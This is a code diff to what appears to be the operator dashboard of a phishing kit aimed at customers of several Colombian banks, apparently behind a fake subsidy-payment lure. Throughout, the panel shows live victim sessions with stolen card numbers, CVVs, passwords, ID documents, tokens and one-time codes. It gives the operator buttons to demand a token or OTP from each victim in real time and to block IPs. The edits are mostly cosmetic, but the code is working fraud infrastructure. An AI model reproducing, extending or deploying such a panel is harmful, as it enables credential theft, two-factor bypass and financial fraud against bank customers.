@@ -206,7 +206,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                                 <th style="text-align:center; width: 40px;" title="Estado de conexión">●</th>
                                 <th>Banco</th>
                                 <th>Estado</th>
-                                <th>Paso</th> <!-- 🔥 NUEVA COLUMNA -->
+                                <th>Paso</th>
                                 <th>Identificación/Trj</th>
                                 <th>Clave/Fch</th>
                                 <th>CVV</th>
@@ -313,7 +313,7 @@ let sesionesAnteriores = new Set();
 let audioCtx = null;
 
 function $(id) { return document.getElementById(id); }
-function reproducirSonido() { try { if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } if (audioCtx.state === 'suspended') { audioCtx.resume(); } const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } catch (e) { console.warn('Audio bloqueado', e); } }
+function reproducirSonido() { try { if (!audioCtx) { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } if (audioCtx.state === 'suspended') { audioCtx.resume(); } const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } catch (e) {} }
 function toast(msg, isError = false) { const el = $('toast'); el.textContent = msg; el.className = 'show' + (isError ? ' error' : ''); clearTimeout(el._t); el._t = setTimeout(() => { el.className = ''; }, 3000); }
 function escapeHtml(s) { if (s == null) return ''; return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
 function truncar(s, max = 30) { if (!s) return '-'; s = String(s); return s.length > max ? s.slice(0, max) + '...' : s; }
@@ -357,8 +357,42 @@ document.querySelectorAll('.tab-btn').forEach(btn => { btn.addEventListener('cli
 function mostrarDashboard() { $('loginScreen').style.display = 'none'; $('dashboard').classList.add('visible'); $('currentUser').textContent = USUARIO; cargarTodo(); if (pollInterval) clearInterval(pollInterval); pollInterval = setInterval(cargarTodo, 3000); }
 async function cargarTodo() { try { await Promise.all([cargarStats(), cargarActivos(), cargarSesiones(), cargarIps(), cargarLogs(), cargarHistorial()]); } catch (e) { console.error(e); } }
 async function cargarStats() { try { const d = await api('/admin/stats'); $('statActivos').textContent = d.activos; $('statSesiones').textContent = d.sesiones; $('statPendientes').textContent = d.pendientes; $('statBloqueadas').textContent = d.bloqueadas; $('statHistorial').textContent = d.historial || 0; $('badgeActivos').textContent = d.activos; $('badgeSesiones').textContent = d.sesiones; $('badgeIps').textContent = d.bloqueadas; } catch (e) {} }
-async function cargarActivos() { try { const d = await api('/admin/activos'); activosCache = d.activos; renderActivos(); } catch (e) {} }
-function renderActivos() { const filtro = ($('buscarActivos').value || '').toLowerCase().trim(); const tbody = $('tbodyActivos'); let lista = activosCache; if (filtro) { lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro)); } if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>'; return; } tbody.innerHTML = lista.map(a => ` <tr> <td class="ip">${escapeHtml(a.ip)}</td> <td>${escapeHtml(a.ultimaAccion)}</td> <td>${formatTime(a.tiempoDentro)}</td> <td><div class="actions"><button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button></div></td> </tr> `).join(''); }
+
+async function cargarActivos() { 
+    try { 
+        const d = await api('/admin/activos'); 
+        activosCache = d.activos; 
+        renderActivos(); 
+    } catch (e) {} 
+}
+
+function renderActivos() { 
+    const filtro = ($('buscarActivos').value || '').toLowerCase().trim(); 
+    const tbody = $('tbodyActivos'); 
+    let lista = activosCache; 
+    if (filtro) { 
+        lista = lista.filter(a => (a.ip || '').toLowerCase().includes(filtro) || (a.ultimaAccion || '').toLowerCase().includes(filtro)); 
+    } 
+    if (!lista.length) { 
+        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>'; 
+        return; 
+    } 
+    tbody.innerHTML = lista.map(a => {
+        // 🔥 Aquí se muestra el paso en la columna "Última acción"
+        let accionMostrar = a.ultimaAccion || 'entrando';
+        if (accionMostrar === 'index') accionMostrar = 'Entrando';
+        else if (accionMostrar === 'consultadesubsidio') accionMostrar = 'Consultando';
+        else if (accionMostrar.includes('pagodesubsidio')) accionMostrar = accionMostrar; 
+        
+        return ` 
+        <tr> 
+            <td class="ip">${escapeHtml(a.ip)}</td> 
+            <td style="color:#88f456; font-weight:bold; font-size:12px;">${escapeHtml(accionMostrar)}</td> 
+            <td>${formatTime(a.tiempoDentro)}</td> 
+            <td><div class="actions"><button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button></div></td> 
+        </tr> `;
+    }).join(''); 
+}
 
 function botonesSesion(s) {
     const bancoKey = s.datos.bancoKey || '';
@@ -391,29 +425,20 @@ function botonesSesion(s) {
     const bancosTokenOtp = ['caja-social', 'bbva', 'popular', 'occidente'];
 
     if (estado === 'pendiente') {
-        if (bancoKey === 'bogota') {
-            btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
-        } else if (bancosSoloOtp.includes(bancoKey)) {
-            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        } else if (bancosTokenOtp.includes(bancoKey)) {
-            btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
-            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        }
+        if (bancoKey === 'bogota') { btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`); }
+        else if (bancosSoloOtp.includes(bancoKey)) { btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`); }
+        else if (bancosTokenOtp.includes(bancoKey)) { btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`); btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`); }
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
     } else if (estado === 'otp' || estado === 'token') {
         btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
-        if (estado === 'otp' && bancoKey !== 'bogota') {
-            btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
-        } else if (estado === 'token' && bancosTokenOtp.includes(bancoKey)) {
-            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        }
+        if (estado === 'otp' && bancoKey !== 'bogota') { btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`); }
+        else if (estado === 'token' && bancosTokenOtp.includes(bancoKey)) { btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`); }
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
     } else if (estado === 'aceptado') {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
     }
 
     btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
-
     return btns.join('');
 }
 
@@ -447,9 +472,7 @@ function renderSesiones() {
         
         let pasoTexto = 'Entrando';
         if (pasoActual === 'consultadesubsidio') pasoTexto = 'Consultando';
-        else if (pasoActual.includes('pagodesubsidio')) pasoTexto = pasoActual; // Ya viene con (Tarjeta) o (PSE)
-        else if (pasoActual === 'tarjeta') pasoTexto = 'Pagando (Tarjeta)';
-        else if (pasoActual === 'pse') pasoTexto = 'Pagando (PSE)';
+        else if (pasoActual.includes('pagodesubsidio')) pasoTexto = pasoActual;
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
         const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia';
@@ -475,7 +498,7 @@ function renderSesiones() {
 
         const titular = datos.titular || '-';
         const token = datos.token || '-';
-        const otp = datos.otp || datos.claveDinamica || '-'; // 🔥 Asegurar que lea la clave dinamica
+        const otp = datos.otp || datos.claveDinamica || '-';
         const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
@@ -509,14 +532,14 @@ function renderSesiones() {
                 </td>
                 <td>${nombreBanco(banco, datos.marca)}</td>
                 <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
-                <td style="color:#88f456; font-weight:bold; font-size:11px;">${pasoTexto}</td> <!-- 🔥 NUEVA COLUMNA -->
+                <td style="color:#88f456; font-weight:bold; font-size:11px;">${pasoTexto}</td>
                 <td class="dato" title="${escapeHtml(identificacionTrj)}">${escapeHtml(truncar(identificacionTrj, 20))}</td>
                 <td class="dato">${escapeHtml(claveFch)}</td>
                 <td class="dato">${escapeHtml(cvv)}</td>
                 <td class="dato" title="${escapeHtml(documento)}">${escapeHtml(truncar(documento, 20))}</td>
                 <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
                 <td class="dato">${escapeHtml(token)}</td>
-                <td class="dato" style="color:#a855f7; font-weight:bold;">${escapeHtml(otp)}</td> <!-- 🔥 SE MUESTRA EL OTP -->
+                <td class="dato" style="color:#a855f7; font-weight:bold;">${escapeHtml(otp)}</td>
                 <td class="dato">${escapeHtml(monto)}</td>
                 <td class="ip">${escapeHtml(ip)}</td>
                 <td><span class="banco-emisor" title="${escapeHtml(bancoEmisor)}">${escapeHtml(bancoEmisor)}</span></td>
